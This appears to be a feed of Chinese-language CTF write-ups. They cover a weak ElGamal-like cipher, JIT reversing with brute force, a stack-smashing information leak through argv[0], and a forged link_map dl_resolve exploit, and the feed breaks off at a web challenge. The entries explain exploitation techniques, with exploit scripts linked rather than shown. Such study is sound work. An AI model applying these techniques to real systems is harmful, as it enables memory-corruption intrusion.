usage: ./special_rsa.py enc …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;這題是很基本的 crypto 題目&lt;br&gt;
從有 94 隊解就知道了...= =&lt;br&gt;
不過我還是想了好久 QQ&lt;br&gt;
對現代密碼學實在不太擅長&lt;br&gt;
這次一邊解一邊研究模運算&lt;br&gt;
趁記憶深刻趕快寫這篇 write-up  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目雖然叫 &lt;strong&gt;Special RSA&lt;/strong&gt; 但是這題跟 RSA 其實沒有很大關連...&lt;br&gt;
還比較像 ElGamel encryption = =&lt;br&gt;
害我還跑去看 ElGamel 有什麼弱點 囧  &lt;/p&gt;
&lt;p&gt;題目給了四個檔案:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;special_rsa.py&lt;/li&gt;
&lt;li&gt;msg.txt&lt;/li&gt;
&lt;li&gt;msg.enc&lt;/li&gt;
&lt;li&gt;flag.enc&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;special_rsa.py&lt;/code&gt; 有 usage, 真好心 XD &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;dada@ubuntu:~/bctf/special_rsa$ ./special_rsa.py&lt;br&gt;
usage: ./special_rsa.py enc|dec input.file output.file  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;加密會把 input 切成很多個 block, 每個 256 byte&lt;br&gt;
每個 block 轉成 數字在用以下公式加密:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;c = (pow(k, r, N) * m) % N&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;c = cipher, m = plain, m &amp;lt; N&lt;br&gt;
r = random number, N = big prime&lt;br&gt;
r 會跟 c 包在一起再用 msgpack 打包&lt;br&gt;
k 沒有給...給了這題就不用解了 XD  &lt;/p&gt;
&lt;p&gt;解密有兩步驟:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;k_inv = modinv(k, N)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;m = pow(k_inv, r, N) * c % N&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;k_inv&lt;/code&gt; 是 k 的模反元素   &lt;/p&gt;
&lt;p&gt;解密的原理是:   &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    pow(k_inv, r, N) * c % N
=   pow(k_inv, r, N) * ((pow(k, r, N) * m) % N) % N
=   (pow(k_inv, r, N) % N) * ((pow(k, r, N) * m) % N) % N   // pow(k_inv, r, N) = pow(k_inv, r, N) % N
=   pow(k_inv, r, N) * (pow(k, r, N) * m) % N               // (a % N * b % N) % N = a * b % N
=   pow(k_inv * k, r, N) * m % N                            // (a * b) ^ r % N = (a ^ r % N) * (b ^ r % N) % N
=   pow(1, r, N) * m % N                                    // k * k_inv % N = 1
=   m % N                                                   // m &amp;lt; N
=   m
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;模運算有幾個重要的特性:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;% 運算子優先度最後  &lt;/li&gt;
&lt;li&gt;滿足加法律  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;a + b % N = (a % N + b % N) % N&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;減法等同加上倒數, 因此也滿足減法  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;a - b % N = (a % N - b % N) % N&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;乘法等於連加, 因此滿足乘法  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;a * b % N = (a % N * b % N) % N&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;除法等同乘上倒數, 倒數就是模反元素  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;a * b_inv % N = (a % N / b % N) % N&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;指數等於連乘, 因此滿足指數律 (&lt;code&gt;^&lt;/code&gt; 表示平方)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;(a * b) ^ r % N = (a ^ r % N) * (b ^ r % N) % N&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;(a - b) ^ r % N = (a ^ r % N) / (b ^ r % N) % N&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;g ^ (a + b) % N = (g ^ a % N) * (g ^ b % N) % N&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;任何數乘上模反元素的餘數會是 1&lt;ul&gt;
&lt;li&gt;&lt;code&gt;a * a_inv % N = 1&lt;/code&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;我們已知 &lt;code&gt;m&lt;/code&gt;, &lt;code&gt;r&lt;/code&gt;, &lt;code&gt;N&lt;/code&gt;, 利用模運算的特性&lt;br&gt;
我們可以反推出 &lt;code&gt;k&lt;/code&gt; 的值  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;求 m 的模反元素  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;m_inv = modinv(m, N)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;將 c 乘上模反元素得到 pow(k, r, N)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;c * m_inv % N = pow(k, r, N) % N = pow(k, r, N)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;msg.enc&lt;/code&gt; 有兩個 block, 重複兩次得到 pow(k, r1, N), pow(k, r2, N)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;p1 = c1 * m_inv % N = pow(k, r1, N) % N = pow(k, r1, N)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;p2 = c2 * m_inv % N = pow(k, r2, N) % N = pow(k, r2, N)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;由於底數相同, p1 &amp;amp; p2 可以做指數的加減法, 目標是求出 pow(k, 1, N)  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;pow(k, 1, N) = k&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;問題變成: &lt;code&gt;r1 * z1 + r2 * z2 = 1&lt;/code&gt;, 解 z1 &amp;amp; z2  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Extended Euclid Algorithm&lt;/strong&gt; 可以解此問題&lt;ul&gt;
&lt;li&gt;&lt;code&gt;egcd(r1, r2) = [gcd(r1, r2), z1, r2]&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;剛好 gcd(r1, r2) = 1  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;把 z1, z2 代回解 &lt;code&gt;pow(k, r1 * z1 + r2 * z2, N)&lt;/code&gt; 即可求得 k  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;a href="https://ddaa.tw/exp/special_rsa.py"&gt;POC&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;BCTF{q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!}&lt;/code&gt;&lt;/p&gt;</content><category term="XCTF"></category><category term="RSA"></category></entry><entry><title>Boston Key Party CTF 2016 Reverse 3 Harvard Jit in my pants</title><link href="https://ddaa.tw/bkpctf_reverse_3_jit_in_my_pants.html" rel="alternate"></link><published>2016-03-15T23:00:00+08:00</published><updated>2016-03-15T23:00:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2016-03-15:/bkpctf_reverse_3_jit_in_my_pants.html</id><summary type="html">&lt;p&gt;剛從成功嶺出來就撞上這場 CTF ... XD&lt;br&gt;
果然是醬油到爆&lt;br&gt;
雖然去成功嶺之前大概也差不多吧 囧  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目給了一個 elf 超混亂 看不懂&lt;br&gt;
但是包含了一些奇怪的字串&lt;br&gt;
丟去 google 可以發現這個 elf 是由 &lt;strong&gt;MyJIT&lt;/strong&gt; 寫成的程式&lt;br&gt;
&lt;a href=""&gt;MyJIt&lt;/a&gt;&lt;br&gt;
其實從題目名稱大概就猜得到這題是 just in time 生成的程式&lt;br&gt;
所以直接逆 elf 是很難看出程式邏輯的  &lt;/p&gt;
&lt;p&gt;第一件事情就是 dump 出程式實際在執行的 code&lt;br&gt;
先用 &lt;code&gt;ltrace&lt;/code&gt; 稍微看一下程式在幹麻&lt;br&gt;
經過一連串不知所云的 &lt;code&gt;malloc&lt;/code&gt; &amp;amp; &lt;code&gt;free&lt;/code&gt; 之後&lt;br&gt;
發現最後會用 &lt;code&gt;puts&lt;/code&gt; 印出 &lt;em&gt;NOPE.&lt;/em&gt;&lt;br&gt;
可以直接在 puts 下斷點&lt;br&gt;
會發現有一塊 rwx 的 memory 在 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;剛從成功嶺出來就撞上這場 CTF ... XD&lt;br&gt;
果然是醬油到爆&lt;br&gt;
雖然去成功嶺之前大概也差不多吧 囧  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;題目給了一個 elf 超混亂 看不懂&lt;br&gt;
但是包含了一些奇怪的字串&lt;br&gt;
丟去 google 可以發現這個 elf 是由 &lt;strong&gt;MyJIT&lt;/strong&gt; 寫成的程式&lt;br&gt;
&lt;a href=""&gt;MyJIt&lt;/a&gt;&lt;br&gt;
其實從題目名稱大概就猜得到這題是 just in time 生成的程式&lt;br&gt;
所以直接逆 elf 是很難看出程式邏輯的  &lt;/p&gt;
&lt;p&gt;第一件事情就是 dump 出程式實際在執行的 code&lt;br&gt;
先用 &lt;code&gt;ltrace&lt;/code&gt; 稍微看一下程式在幹麻&lt;br&gt;
經過一連串不知所云的 &lt;code&gt;malloc&lt;/code&gt; &amp;amp; &lt;code&gt;free&lt;/code&gt; 之後&lt;br&gt;
發現最後會用 &lt;code&gt;puts&lt;/code&gt; 印出 &lt;em&gt;NOPE.&lt;/em&gt;&lt;br&gt;
可以直接在 puts 下斷點&lt;br&gt;
會發現有一塊 rwx 的 memory 在 &lt;code&gt;0x778000&lt;/code&gt;&lt;br&gt;
dump 出來就會是 runtime 實際在運作的程式了  &lt;/p&gt;
&lt;p&gt;轉回 asm 會發覺整段只有一個 function&lt;br&gt;
不知道能不能丟回 ida 轉 pseudo code...&lt;br&gt;
如果有人知道怎麼做麻煩教我一下 QQ&lt;br&gt;
這段 code 跳來跳去而且用了很多不常見的指令&lt;br&gt;
靜態分析看不太懂&lt;br&gt;
追一追就掉到 loop 裡了&lt;br&gt;
loop 裡會一直 call 那堆不知所云的 &lt;code&gt;malloc&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;0000000000778144 ff95f8feffff     call qword [rbp-0x108]  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在這邊卡了一陣子&lt;br&gt;
後來回去追 elf 的流程發現 &lt;code&gt;0x4473ef&lt;/code&gt; 在處理 output 訊息&lt;br&gt;
字串不是直接放在 rodata&lt;br&gt;
而是一個 byte 一個 byte 處理&lt;br&gt;
做出字串再丟到 &lt;code&gt;puts&lt;/code&gt;&lt;br&gt;
所以一開始沒有發現這個 function ...&lt;br&gt;
&lt;code&gt;0x4473ef&lt;/code&gt; 會根據第一個參數的內容是 0 or 1 or 2&lt;br&gt;
決定要印出哪個字串 (Nope/Congraz.../Usage)&lt;br&gt;
往回追是什麼地方會 call &lt;code&gt;0x4473ef&lt;/code&gt;&lt;br&gt;
結果發現跟 call malloc 的是同一行...囧&lt;br&gt;
繼續往回追 rdi 是怎麼來的&lt;br&gt;
跟蹤一連串的 jmp 以後&lt;br&gt;
大概三四次吧 其實沒有很多&lt;br&gt;
可以找到比對 flag 的關鍵點 而且是線性比對&lt;br&gt;
所以可以用爆破的方式一個一個 byte 爆出 flag
 &lt;code&gt;0x77827f&lt;/code&gt; 會將正確的長度放在 rcx&lt;br&gt;
因此只要看目前正確的長度數量&lt;br&gt;
就可以判斷有沒有猜對了&lt;br&gt;
後面生成 flag 的部分我就懶得看了&lt;br&gt;
直接用爆破的方式爆出 flag  &lt;/p&gt;
&lt;p&gt;順帶一提 我一直以為 bostonkeyparty 的縮寫是 BKT&lt;br&gt;
前面先打好 prefix 結果怎麼爆都不對...&lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;BKPCTF{S1de_Ch4nnel_att4cks_are_s0_1338}&lt;/code&gt;  &lt;/p&gt;</content><category term="BKPCTF"></category></entry><entry><title>32C3CTF 2015 PWN 200 readme</title><link href="https://ddaa.tw/32c3ctf_2015_pwn_200_readme.html" rel="alternate"></link><published>2015-12-31T18:21:00+08:00</published><updated>2015-12-31T18:21:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-12-31:/32c3ctf_2015_pwn_200_readme.html</id><summary type="html">&lt;p&gt;這題被安博給攔胡了 T_T&lt;br&gt;
沒發現 rodata 有 flag 可以 leak XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題一開始打開來看沒什麼頭緒&lt;br&gt;
然後一堆隊伍都秒解出來 = =&lt;br&gt;
嘗試塞很長的 payload 結果發生奇怪的 crash&lt;br&gt;
&lt;code&gt;__GI_getenv (name=0x7ffff7b9c26b "BC_FATAL_STDERR_",...&lt;/code&gt;&lt;br&gt;
於是把 &lt;code&gt;LIBC_FATAL_STDERR&lt;/code&gt; 當成關鍵字丟進 google&lt;br&gt;
找到一篇韓國 conference &lt;em&gt;inc0gnito&lt;/em&gt; 的 &lt;a href="http://inc0gnito.com/Inc0gnito/ssp.pdf"&gt;pdf&lt;/a&gt;&lt;br&gt;
裡面有提到觸發 stack guard 以後&lt;br&gt;
可以透過覆蓋環境變數 leak memory  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# sysdeps/unix/sysv/linux/libc_fatal.c
/* Open a descriptor for /dev/ttyunless the user explicitly …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這題被安博給攔胡了 T_T&lt;br&gt;
沒發現 rodata 有 flag 可以 leak XD  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題一開始打開來看沒什麼頭緒&lt;br&gt;
然後一堆隊伍都秒解出來 = =&lt;br&gt;
嘗試塞很長的 payload 結果發生奇怪的 crash&lt;br&gt;
&lt;code&gt;__GI_getenv (name=0x7ffff7b9c26b "BC_FATAL_STDERR_",...&lt;/code&gt;&lt;br&gt;
於是把 &lt;code&gt;LIBC_FATAL_STDERR&lt;/code&gt; 當成關鍵字丟進 google&lt;br&gt;
找到一篇韓國 conference &lt;em&gt;inc0gnito&lt;/em&gt; 的 &lt;a href="http://inc0gnito.com/Inc0gnito/ssp.pdf"&gt;pdf&lt;/a&gt;&lt;br&gt;
裡面有提到觸發 stack guard 以後&lt;br&gt;
可以透過覆蓋環境變數 leak memory  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# sysdeps/unix/sysv/linux/libc_fatal.c
/* Open a descriptor for /dev/ttyunless the user explicitly
     requests errors on standard error.  */
  constchar *on_2 = __secure_getenv(&amp;quot;LIBC_FATAL_STDERR_&amp;quot;);
  if (on_2 == NULL || *on_2 == &amp;#39;\0&amp;#39;)
    fd= open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);
  if (fd == -1)
    fd= STDERR_FILENO;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;只要把 &lt;code&gt;LIBC_FATAL_STDERR&lt;/code&gt; 隨便設一個值&lt;br&gt;
程式就會被 stderr 的訊息給噴回來了&lt;br&gt;
開啟 stack guard 後如果發生 bof 會噴出像這樣的錯誤訊息：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;*** stack smashing detected ***: ./readme.bin terminated&lt;br&gt;
Aborted (core dumped)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;pdf 提到透過覆蓋 &lt;code&gt;__libc_argv[0]&lt;/code&gt;&lt;br&gt;
把內容改成我們想要 leak 的 address&lt;br&gt;
就可以達成 infomation leak  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# debug/fortify_fail.c
__libc_message(2, &amp;quot;*** %s ***: %s terminated\n&amp;quot;,msg, __libc_argv[0] ?: &amp;quot;&amp;lt;unknown&amp;gt;&amp;quot;);
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這題很好心也很壞心的讓我們可以在 &lt;code&gt;0x600d20&lt;/code&gt; 寫值&lt;br&gt;
但是那邊也是 flag 的位置...囧&lt;br&gt;
我們可以把內容設成 &lt;code&gt;LIBC_FATAL_STDERR=xxx&lt;/code&gt;&lt;br&gt;
在 overflow 的時候在 552 offset 的位置蓋上 &lt;code&gt;0x600d20&lt;/code&gt;&lt;br&gt;
就可以控制 &lt;code&gt;LIBC_FATAL_STDERR&lt;/code&gt; 的值了&lt;br&gt;
這樣就可以把 stderr 噴回來&lt;br&gt;
剩下的問題就是 leak 什麼內容&lt;br&gt;
這題雖然看似在 &lt;code&gt;0x600d20&lt;/code&gt; 會把 flag 內容覆蓋掉&lt;br&gt;
但是在 elf 初始化時會把字串留在 &lt;code&gt;0x400d20&lt;/code&gt; rodata 段上面&lt;br&gt;
因此這題把 &lt;code&gt;0x400d20&lt;/code&gt; 的內容 leak 出來&lt;br&gt;
就可以獲得 flag 了  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hello!&lt;br&gt;
What's your name? Nice to meet you, .&lt;br&gt;
Please overwrite the flag: Thank you, bye!&lt;br&gt;
&lt;code&gt;*** stack smashing detected ***: 32C3_ELF_caN_b3_pre7ty_we!rd... terminated&lt;/code&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;exploit: &lt;a href="https://ddaa.tw/exp/readme.py"&gt;meh.py&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;32C3_ELF_caN_b3_pre7ty_we!rd&lt;/code&gt;  &lt;/p&gt;</content><category term="3XC3CTF"></category><category term="Stack Overflow"></category><category term="Trick"></category></entry><entry><title>HITCON 2015 PWN 200 blinkroot</title><link href="https://ddaa.tw/hitcon_pwn_200_blinkroot.html" rel="alternate"></link><published>2015-10-20T01:23:00+08:00</published><updated>2015-10-20T01:23:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-10-20:/hitcon_pwn_200_blinkroot.html</id><summary type="html">&lt;p&gt;這次也是一題都沒解出來&lt;br&gt;
大概是沒天份吧&lt;br&gt;
不過其實後來知道怎麼偽造 link_map 以後&lt;br&gt;
比賽期間寫的 payload 一度已經很接近了...&lt;br&gt;
只是後來方向錯了 Orz...   &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題的程式非常簡單&lt;br&gt;
pseudo code 長這樣:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;char data[1024];
int main()
{
    if (recvlen(0, data, 1024) == 1024) {
        close(0);
        close(1);
        close(1);
        data[(int)data] = (int128)(0x1000000000 | data[8]);
        puts(data[16]);
    }
    exit(0);
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;前八個 byte 可以任意控制&lt;br&gt;
所以會造成任意寫值的問題
這題不知道用什麼方式&lt;br&gt;
組合語言是透過 xmm0 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;這次也是一題都沒解出來&lt;br&gt;
大概是沒天份吧&lt;br&gt;
不過其實後來知道怎麼偽造 link_map 以後&lt;br&gt;
比賽期間寫的 payload 一度已經很接近了...&lt;br&gt;
只是後來方向錯了 Orz...   &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題的程式非常簡單&lt;br&gt;
pseudo code 長這樣:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;char data[1024];
int main()
{
    if (recvlen(0, data, 1024) == 1024) {
        close(0);
        close(1);
        close(1);
        data[(int)data] = (int128)(0x1000000000 | data[8]);
        puts(data[16]);
    }
    exit(0);
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;前八個 byte 可以任意控制&lt;br&gt;
所以會造成任意寫值的問題
這題不知道用什麼方式&lt;br&gt;
組合語言是透過 xmm0 寫值&lt;br&gt;
能寫的位置一定要對齊 16 byte (addr &amp;amp; 0xf == 0)&lt;br&gt;
而且前 8 byte 還固定成 0x10&lt;br&gt;
所以不能單純靠改 &lt;code&gt;.dynamic&lt;/code&gt; 來解這題&lt;br&gt;
那這題的作法是偽造 &lt;em&gt;link_map&lt;/em&gt; 以後做 &lt;em&gt;dl_resolve&lt;/em&gt;&lt;br&gt;
目標讓呼叫 &lt;code&gt;puts(data[16])&lt;/code&gt; 變成解出 &lt;code&gt;system[data[16]]&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;dl_resolve&lt;/em&gt; 是 ELF 有做 lazy binding 的時候&lt;br&gt;
function call 不會直接跳進 libc&lt;br&gt;
而是透過 got.plt 得到 function 的 index 後&lt;br&gt;
跳到 PLT0 才解析出 function 在 libc 中的位置&lt;br&gt;
簡單來說大概就是做這樣的事情&lt;br&gt;
&lt;code&gt;dl_runtime_resolve (link_map,index)&lt;/code&gt;&lt;br&gt;
&lt;em&gt;dl_resolve&lt;/em&gt; 裡面還會 call &lt;code&gt;_dl_fixup&lt;/code&gt;&lt;br&gt;
&lt;code&gt;_dl_fixup&lt;/code&gt; 才是真正去查 libc address 的地方  &lt;/p&gt;
&lt;p&gt;以前考過的 &lt;em&gt;dl_resolve&lt;/em&gt; 的做法&lt;br&gt;
是透過偽造 index&lt;br&gt;
讓 &lt;code&gt;__fix_up&lt;/code&gt; 去解 symbol 時落在我們偽造的 &lt;em&gt;SYMTAB&lt;/em&gt; 上面&lt;br&gt;
再讓查 &lt;code&gt;st_name&lt;/code&gt; 時落在我們想要執行的 function 名稱&lt;br&gt;
這題的沒辦法去控制 index&lt;br&gt;
所以變成只能從偽造 &lt;em&gt;link_map&lt;/em&gt; 下手  &lt;/p&gt;
&lt;p&gt;根據我比賽時的整整 12 個小時的嘗試...&lt;br&gt;
完整的偽造 &lt;em&gt;link_map&lt;/em&gt; 是不可能做到的 T__T&lt;br&gt;
原因是 &lt;em&gt;link_map&lt;/em&gt; 中有一個 &lt;code&gt;l_scope&lt;/code&gt; 的 member&lt;br&gt;
在 &lt;code&gt;_dl_fixup&lt;/code&gt; 內部的 &lt;code&gt;_dl_lookup_symbol_x&lt;/code&gt; 會用上&lt;br&gt;
&lt;code&gt;l_scope&lt;/code&gt; 會指向 &lt;em&gt;link_map&lt;/em&gt; 本身&lt;br&gt;
&lt;em&gt;link_map&lt;/em&gt; 的結構是一個 linked_list&lt;br&gt;
每個 node 保存 elf 和有使用到的 shared library symbol&lt;br&gt;
&lt;code&gt;_dl_lookup_symbol_x&lt;/code&gt; 比對所有 shared library 的 symbol&lt;br&gt;
試著找出目前 function call 的這個 symbol&lt;br&gt;
我們無法得知 glibc 的 &lt;em&gt;link_map&lt;/em&gt; ... 所以不可能偽造成功 QQ  &lt;/p&gt;
&lt;p&gt;那 &lt;em&gt;dl_resolve&lt;/em&gt; 還有一個利用方式是:&lt;br&gt;
如果 function 已經被解析過&lt;br&gt;
&lt;a href="https://github.com/lattera/glibc/blob/master/elf/dl-runtime.c#L90"&gt;dl-runtime.c:90&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&amp;gt;st_other), 0) == 0) { ... }&lt;/code&gt;&lt;br&gt;
&lt;code&gt;else { ... }&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;會直接進入 else, 不會進入 &lt;code&gt;_dl_lookup_symbols_x&lt;/code&gt;&lt;br&gt;
直接透過 &lt;code&gt;link_map-&amp;gt;l_addr + sym-&amp;gt;st_value&lt;/code&gt; 得到結果&lt;br&gt;
這兩個值都可以透過偽造 &lt;em&gt;link_map&lt;/em&gt; 來控制&lt;br&gt;
如果在已知 libc 版本的情況下&lt;br&gt;
我們可以讓 &lt;code&gt;l_addr&lt;/code&gt; 或 &lt;code&gt;st_value&lt;/code&gt; 其中一個是以解析過的 function&lt;br&gt;
另一個則透過 libc 算出適當的 offset&lt;br&gt;
就可以跳到任意函式了&lt;br&gt;
還有一個要注意的是&lt;br&gt;
原本 &lt;em&gt;dl_resolve&lt;/em&gt; 解析完會將結果寫回 GOT 上&lt;br&gt;
但是 offset 亂掉了結果可能會是一個不能寫的區段&lt;br&gt;
所以還要偽造 &lt;em&gt;JMPREL&lt;/em&gt; 結果能寫回去才行&lt;br&gt;
至於要寫到哪裡就隨意了 反正之後不會用上  &lt;/p&gt;
&lt;p&gt;這題我先嘗試讓 &lt;em&gt;link_map&lt;/em&gt; 落在 &lt;code&gt;__libc_start_main&lt;/code&gt; 的 GOT&lt;br&gt;
這樣 &lt;code&gt;l_addr&lt;/code&gt; 就會是 &lt;code&gt;__libc_start_main&lt;/code&gt; 的 address&lt;br&gt;
再偽造 &lt;code&gt;STMTAB&lt;/code&gt; 和 &lt;em&gt;JMPREL&lt;/em&gt; 得到 &lt;code&gt;st_value&lt;/code&gt; 並算出 system 的位置&lt;br&gt;
結果是成功的...但是這題有個問題是&lt;br&gt;
如果這樣子偽造, &lt;em&gt;link_map&lt;/em&gt; 會在 &lt;code&gt;data - 0x48&lt;/code&gt; 的位置&lt;br&gt;
但是 &lt;em&gt;SYMTAB&lt;/em&gt; 的位置在 &lt;code&gt;link_map + 0x68 == data + 0x20&lt;/code&gt;&lt;br&gt;
&lt;code&gt;puts&lt;/code&gt; 的參數卻是 &lt;code&gt;data[0x10]&lt;/code&gt;...&lt;br&gt;
所以能執行的指令就變成不能超過 16 byte XD&lt;br&gt;
對於一般的題目倒也沒差&lt;br&gt;
但是這題把 fd 都關了所以只能把執行結果送回來而已&lt;br&gt;
16 byte 根本不夠用 Orz  &lt;/p&gt;
&lt;p&gt;第二次的做法就變成讓 &lt;em&gt;link_map&lt;/em&gt; 完整的落在 data[512] 上&lt;br&gt;
&lt;code&gt;l_addr&lt;/code&gt; 可以隨意控制&lt;br&gt;
再將 &lt;em&gt;SYMTAB&lt;/em&gt; 偽造到 GOT 上&lt;br&gt;
滿足 &lt;code&gt;st_other != 0&lt;/code&gt; 且 &lt;code&gt;st_value == libc address&lt;/code&gt;&lt;br&gt;
一樣要偽造 &lt;em&gt;JMPREL&lt;/em&gt; 讓結果可以寫回去&lt;br&gt;
就可以解出任意的 libc function 了&lt;br&gt;
後來想想第二種的做法似乎限制比較少&lt;br&gt;
更好利用  &lt;/p&gt;
&lt;p&gt;總結一下透過 &lt;code&gt;st_other&lt;/code&gt; 的利用條件:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;已經有 glibc 可以算 offset&lt;/li&gt;
&lt;li&gt;有大約 0x140 以上的 buffer 可以偽造 &lt;em&gt;link_map&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;取決於 function index, 越後面所需空間越大&lt;/li&gt;
&lt;li&gt;可以 return 到 plt 上, 或是可以改 got 上的 &lt;em&gt;link_map&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;要已知可寫的 address ... 所以開 PIE 這招大概還是不能用 Orz&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;flag: &lt;code&gt;hitcon{81inkr0Qt I$ #B|InK1n9#}&lt;/code&gt;&lt;/p&gt;</content><category term="HITCON CTF"></category><category term="dl_resolve"></category></entry><entry><title>CSAW CTF 2015 web 500 Weebdate</title><link href="https://ddaa.tw/csawctf_web_500_weebdate.html" rel="alternate"></link><published>2015-09-22T00:24:00+08:00</published><updated>2015-09-22T00:24:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2015-09-22:/csawctf_web_500_weebdate.html</id><summary type="html">&lt;p&gt;這題能解出來要歸功於&lt;br&gt;
&lt;strong&gt;ding&lt;/strong&gt;, &lt;strong&gt;happyholic1203&lt;/strong&gt;, &lt;strong&gt;mangoking&lt;/strong&gt;, &lt;strong&gt;jpeanut&lt;/strong&gt;&lt;br&gt;
已經把前面的問題都找出了&lt;br&gt;
我其實只是撿尾刀而已...  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;不過還是厚著臉皮寫一下 write up&lt;br&gt;
不然這邊 web 分類文章都空空蕩蕩...  &lt;/p&gt;
&lt;p&gt;這題的背景故事是&lt;br&gt;
有一個叫做 &lt;strong&gt;Donald Trump&lt;/strong&gt; 的傢伙在這個交友網站註冊了帳號&lt;br&gt;
用來當作販毒的聯絡管道云云&lt;br&gt;
需要破出他的二段式認證 (&lt;code&gt;password&lt;/code&gt; + &lt;code&gt;TOTPKEY&lt;/code&gt;) 登入他的帳號&lt;br&gt;
這題的 &lt;code&gt;flag = md5(TOTPKEY + password)&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;這個交友網站除了一般的帳號密碼以外&lt;br&gt;
還需要填入 oath 解 &lt;code&gt;TOTPKEY&lt;/code&gt; 的結果才能成功登入&lt;br&gt;
可以用以下指令來解:&lt;br&gt;
